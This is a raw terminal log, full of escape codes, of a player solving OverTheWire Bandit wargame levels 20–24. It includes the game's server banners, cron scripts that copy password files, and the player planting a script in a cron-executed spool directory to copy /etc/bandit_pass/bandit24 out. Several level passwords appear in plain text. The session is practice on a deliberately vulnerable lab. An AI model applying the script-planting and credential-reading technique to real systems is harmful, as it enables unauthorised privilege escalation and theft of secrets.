+[?2004h]0;bandit20@bandit: ~[01;32mbandit20@bandit[00m:[01;34m~[00m$ ./suconnect ls[K./suconnect 2020
+[?2004lCould not connect
+[?2004h]0;bandit20@bandit: ~[01;32mbandit20@bandit[00m:[01;34m~[00m$ ./suconnect 2020
+[?2004lCould not connect
+[?2004h]0;bandit20@bandit: ~[01;32mbandit20@bandit[00m:[01;34m~[00m$ ./suconnect 2020[K[K[K[K64846[K
+[?2004lCould not connect
+[?2004h]0;bandit20@bandit: ~[01;32mbandit20@bandit[00m:[01;34m~[00m$ ./suconnect 6484[K[K[K[K2424
+[?2004lRead: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+Password matches, sending next password
+[?2004h]0;bandit20@bandit: ~[01;32mbandit20@bandit[00m:[01;34m~[00m$ [?2004l
+logout
+Connection to bandit.labs.overthewire.org closed.
+[?2004h[feizal@mzamilsaid--->~]$ ssh bandit20@bandit.labs.overthewire.org -p 2220 [A[C[C[C[C[C[C[C[C[C[C[C[C@bandit.lab[1P[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1@bandit.la[1@b[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit21@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+[?2004h]0;bandit21@bandit: ~[01;32mbandit21@bandit[00m:[01;34m~[00m$ [K]0;bandit21@bandit: ~[01;32mbandit21@bandit[00m:[01;34m~[00m$ ls
+[?2004l[?2004h]0;bandit21@bandit: ~[01;32mbandit21@bandit[00m:[01;34m~[00m$ cd /etc/cron.d
+[?2004l[?2004h]0;bandit21@bandit: /etc/cron.d[01;32mbandit21@bandit[00m:[01;34m/etc/cron.d[00m$ ls
+[?2004lcronjob_bandit22  cronjob_bandit24  [0m[01;32motw-tmp-dir[0m
+cronjob_bandit23  e2scrub_all       sysstat
+[?2004h]0;bandit21@bandit: /etc/cron.d[01;32mbandit21@bandit[00m:[01;34m/etc/cron.d[00m$ ca cronjob_bandit2
+[?2004lca: command not found
+[?2004h]0;bandit21@bandit: /etc/cron.d[01;32mbandit21@bandit[00m:[01;34m/etc/cron.d[00m$ ca cronjob_bandit22[C[C2 cronjob_bandit22[1P cronjob_bandit22t cronjob_bandit22
+[?2004l@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+[?2004h]0;bandit21@bandit: /etc/cron.d[01;32mbandit21@bandit[00m:[01;34m/etc/cron.d[00m$ cat [7m/usr/bin/cronjob_bandit22.sh[27m/usr/bin/cronjob_bandit22.sh
+[?2004l#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+[?2004h]0;bandit21@bandit: /etc/cron.d[01;32mbandit21@bandit[00m:[01;34m/etc/cron.d[00m$ cat [7m/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv[27m
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+[A
+[?2004ltRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+[?2004h]0;bandit21@bandit: /etc/cron.d[01;32mbandit21@bandit[00m:[01;34m/etc/cron.d[00m$ [?2004l
+logout
+Connection to bandit.labs.overthewire.org closed.
+[?2004h[feizal@mzamilsaid--->~]$ ssh bandit21@bandit.labs.overthewire.org -p 2220 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C@bandit.labs.overthewire.org -p 2220[1P [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2@bandit.labs.overthewire.org -p 2220 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit22@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+[?2004h]0;bandit22@bandit: ~[01;32mbandit22@bandit[00m:[01;34m~[00m$ ls
+[?2004l[?2004h]0;bandit22@bandit: ~[01;32mbandit22@bandit[00m:[01;34m~[00m$ cd /etc/cron.d
+[?2004l[?2004h]0;bandit22@bandit: /etc/cron.d[01;32mbandit22@bandit[00m:[01;34m/etc/cron.d[00m$ cat cronjob_bandit23
+[?2004l@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+[?2004h]0;bandit22@bandit: /etc/cron.d[01;32mbandit22@bandit[00m:[01;34m/etc/cron.d[00m$ cat [7m/usr/bin/cronjob_bandit23.sh[27m/usr/bin/cronjob_bandit23.sh
+[?2004l#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+[?2004h]0;bandit22@bandit: /etc/cron.d[01;32mbandit22@bandit[00m:[01;34m/etc/cron.d[00m$ mynae[K,[Kme=smyname=emyname=[1Pmyname=[1Pmyname=emyname=xmyname=pmyname=omyname=rmyname=tmyname= myname=smyname=emyname=tmyname= myname=[C[C[C[C[C[C[Cbandit24[K3
+[?2004l[?2004h]0;bandit22@bandit: /etc/cron.d[01;32mbandit22@bandit[00m:[01;34m/etc/cron.d[00m$ cat /tmp/$mytarget
+[?2004lcat: /tmp/: Permission denied
+[?2004h]0;bandit22@bandit: /etc/cron.d[01;32mbandit22@bandit[00m:[01;34m/etc/cron.d[00m$ export myat[K[Ktarget=[7m$(echo I am user $myname | [27m[7mm[27m[7md5sum | cut -d ' ' -f 1)[27m[A]0;bandit22@bandit: /etc/cron.d[01;32mbandit22@bandit[00m:[01;34m/etc/cron.d[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+[?2004l[?2004h]0;bandit22@bandit: /etc/cron.d[01;32mbandit22@bandit[00m:[01;34m/etc/cron.d[00m$ export mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)[A]0;bandit22@bandit: /etc/cron.d[01;32mbandit22@bandit[00m:[01;34m/etc/cron.d[00m$ [25Pcat /tmp/$mytarget
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[?2004l0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+[?2004h]0;bandit22@bandit: /etc/cron.d[01;32mbandit22@bandit[00m:[01;34m/etc/cron.d[00m$ [?2004l
+logout
+Connection to bandit.labs.overthewire.org closed.
+[?2004h[feizal@mzamilsaid--->~]$ ssh bandit22@bandit.labs.overthewire.org -p 2220 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1
+[C[C[C[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2
+[C[C[C[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C@bandit.labs.overthewire.org -p 2220[1P [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C3@bandit.labs.overthewire.org -p 2220 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit23@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+[?2004h]0;bandit23@bandit: ~[01;32mbandit23@bandit[00m:[01;34m~[00m$ cd /etc/cron.d
+[?2004l[?2004h]0;bandit23@bandit: /etc/cron.d[01;32mbandit23@bandit[00m:[01;34m/etc/cron.d[00m$ ls
+[?2004lcronjob_bandit22  cronjob_bandit24  [0m[01;32motw-tmp-dir[0m
+cronjob_bandit23  e2scrub_all       sysstat
+[?2004h]0;bandit23@bandit: /etc/cron.d[01;32mbandit23@bandit[00m:[01;34m/etc/cron.d[00m$ cat cronjob_bandit24
+[?2004l@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+[?2004h]0;bandit23@bandit: /etc/cron.d[01;32mbandit23@bandit[00m:[01;34m/etc/cron.d[00m$ cat [7m/usr/bin/cronjob_bandit24.sh[27m/usr/bin/cronjob_bandit24.sh
+[?2004l#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+[?2004h]0;bandit23@bandit: /etc/cron.d[01;32mbandit23@bandit[00m:[01;34m/etc/cron.d[00m$ export set myns[Kame=bandit24
+[?2004l[?2004h]0;bandit23@bandit: /etc/cron.d[01;32mbandit23@bandit[00m:[01;34m/etc/cron.d[00m$ cd cat [Kmktemp 
+[?2004l/tmp/tmp.wsTPvGeGSg
+[?2004h]0;bandit23@bandit: /etc/cron.d[01;32mbandit23@bandit[00m:[01;34m/etc/cron.d[00m$ mktemp -d
+[?2004l/tmp/tmp.2rGGaID5HN
+[?2004h]0;bandit23@bandit: /etc/cron.d[01;32mbandit23@bandit[00m:[01;34m/etc/cron.d[00m$ cd [7m/tmp/tmp.2rGGaID5HN[27m
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/tmp/tmp.2rGGaID5HN
+[A
+[?2004l[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ nano script.sh
+[?2004l[?2004h[?1049h[22;0;0t[1;31r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[29;31H(B[0;7m[ New File ](B[m[H(B[0;7m  GNU nano 7.2                    script.sh                             [1;71H(B[m[29;22H(B[0;1m[37m[41m[ Problems with history file ][39;49m(B[m[30d(B[0;7m^G(B[m Help[15G(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[30;57H(B[0;7m^T(B[m Execute[31d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste[57G(B[0;7m^J(B[m Justify[2d[?12l[?25h[?25l[1;45H(B[0;7m*[71G(B[m[?12l[?25h[2d[36m#[39m(B[m[?25l[?12l[?25h[36m![39m(B[m[?25l[?12l[?25h[36m/[39m(B[m[?25l[?12l[?25h[36mb[39m(B[m[?25l[?12l[?25h[36mi[39m(B[m[?25l[?12l[?25h[36mn[39m(B[m[?25l[?12l[?25h[36m/[39m(B[m[?25l[?12l[?25h[36mb[39m(B[m[?25l[?12l[?25h[36ma[39m(B[m[?25l[?12l[?25h[36ms[39m(B[m[?25l[?12l[?25h[36mh[39m(B[m[?25l[3d[?12l[?25h[?25l[?12l[?25hc[?25l[?12l[?25ha[?25l[?12l[?25h(B[0;1m[34mcat[39m(B[m[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h /[?25l[?12l[?25he[?25l[?12l[?25ht[?25l[29d[K[?12l[?25h[3;8Hc[?25l[?12l[?25h[32m;[39m(B[m[?25l[?12l[?25h.[?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h/[?25l[?12l[?25hb[?25l[?12l[?25ha[?25l[?12l[?25hn[?25l[?12l[?25hd[?25l[?12l[?25hi[?25l[?12l[?25ht[?25l[?12l[?25h_[?25l[?12l[?25hp[?25l[?12l[?25ha[?25l[?12l[?25hs[?25l[?12l[?25hs[?25l[?12l[?25h/[?25l[?12l[?25hb[?25l[?12l[?25ha[?25l[?12l[?25hn[?25l[?12l[?25hd[?25l[?12l[?25hi[?25l[?12l[?25ht[?25l[?12l[?25h2[?25l[?12l[?25h4[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h [32m>[39m(B[m[?25l[?12l[?25h[42m [49m(B[m[?25l[?12l[?25h t[?25l[?12l[?25hm[?25l[?12l[?25hp[?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h[42m [49m(B[m[K[?25l /tmp/tmp.2rGGaID5HN[4d[?12l[?25h[?25l[29d(B[0;7mSave modified buffer?                                                   [30;1H Y(B[m Yes[K[31d(B[0;7m N(B[m No  [15G  (B[0;7m^C(B[m Cancel[K[29;23H[?12l[?25h[?25l[30d(B[0;7m^G(B[m Help[30;19H(B[0;7mM-D(B[m DOS Format    (B[0;7mM-A(B[m Append[30;55H(B[0;7mM-B(B[m Backup File[31d(B[0;7m^C(B[m Cancel[17G  (B[0;7mM-M(B[m Mac Format    (B[0;7mM-P(B[m Prepend[55G(B[0;7m^T(B[m Browse[29d(B[0;7mFile Name to Write: script.sh(B[m[?12l[?25h[?25l[1K (B[0;7m[ Writing... ](B[m[K[1;45H(B[0;7m [71G(B[m[29;28H(B[0;7m[ Wrote 3 lines ](B[m[J[31d[?12l[?25h[31;1H[?1049l[23;0;0t[?1l>[?2004lUnable to create directory /home/bandit23/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ touch passwordnano script.sh
+[?2004l[?2004h[?1049h[22;0;0t[1;31r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[29;30H(B[0;7m[ Reading... ](B[m[29;29H(B[0;7m[ Read 3 lines ](B[m[H(B[0;7m  GNU nano 7.2                    script.sh                             [1;71H(B[m[29;22H(B[0;1m[37m[41m[ Problems with history file ][39;49m(B[m[30d(B[0;7m^G(B[m Help[15G(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[30;57H(B[0;7m^T(B[m Execute[31d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste[57G(B[0;7m^J(B[m Justify[2d[36m#!/bin/bash[3d(B[0;1m[34mcat[39m(B[m /etc/bandit_pass/bandit24 [32m>[39m(B[m /tmp/tmp.2rGGaID5HN[A[?12l[?25h[?25l[?12l[?25h[5d[?25l[?12l[?25h[?25l[?12l[?25h[A[?25l[?12l[?25h[3;52H[?25l[1;45H(B[0;7m*[71G(B[m[?12l[?25h[3;52H/[?25l[?12l[?25hp[?25l[?12l[?25ha[?25l[?12l[?25hs[?25l[?12l[?25hs[?25l[?12l[?25hw[?25l[?12l[?25hd[?25l[4d[?12l[?25h[?25l[29d(B[0;7mSave modified buffer?                                                   [30;1H Y(B[m Yes[K[31d(B[0;7m N(B[m No  [15G  (B[0;7m^C(B[m Cancel[K[29;23H[?12l[?25h[?25l[30d(B[0;7m^G(B[m Help[30;19H(B[0;7mM-D(B[m DOS Format    (B[0;7mM-A(B[m Append[30;55H(B[0;7mM-B(B[m Backup File[31d(B[0;7m^C(B[m Cancel[17G  (B[0;7mM-M(B[m Mac Format    (B[0;7mM-P(B[m Prepend[55G(B[0;7m^T(B[m Browse[29d(B[0;7mFile Name to Write: script.sh(B[m[?12l[?25h[?25l[1K (B[0;7m[ Writing... ](B[m[K[1;45H(B[0;7m [71G(B[m[29;28H(B[0;7m[ Wrote 4 lines ](B[m[J[31d[?12l[?25h[31;1H[?1049l[23;0;0t[?1l>[?2004lUnable to create directory /home/bandit23/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ nano script.shcd /tmp/tmp.2rGGaID5HN[Ktoi[Kuch passwo[Kd
+[?2004l[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ chmof[Kd 777 [7m/tmp/tmp.2rGGaID5HN[27m
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/tmp/tmp.2rGGaID5HN
+[A
+[?2004l[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ chmod 777 /tmp/tmp.2rGGaID5HN -R'\[K[K
+[?2004l[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ cp script.sh /var/spol[Kol/bandit24/
+[?2004lcp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
+[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ ope[Kcat passwd 
+[?2004l[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ cat passwd p script.sh /var/spool/bandit24/fo o
+[?2004l[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ cp script.sh /var/spool/bandit24/foo[A]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ [Cat passwd [K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[?2004l[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ cat passwd 
+[?2004l[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ cat passwd 
+[?2004l[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ cat passwd [Kcat script.sh 
+[?2004l#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.2rGGaID5HN/passwd
+
+
+[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ cat passwd 
+[?2004l[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ vay [Kcat passwd 
+[?2004lgb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+[?2004h]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ cat /etc/bandit_pass/bandit24 > /[7m/t[27m[7mm[27m[7mp/tmp.2rGGaID5HN [27m
+[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/tmp/tmp.2rGGaID5HN[C[C[C[C[C[C[C[A]0;bandit23@bandit: /tmp/tmp.2rGGaID5HN[01;32mbandit23@bandit[00m:[01;34m/tmp/tmp.2rGGaID5HN[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
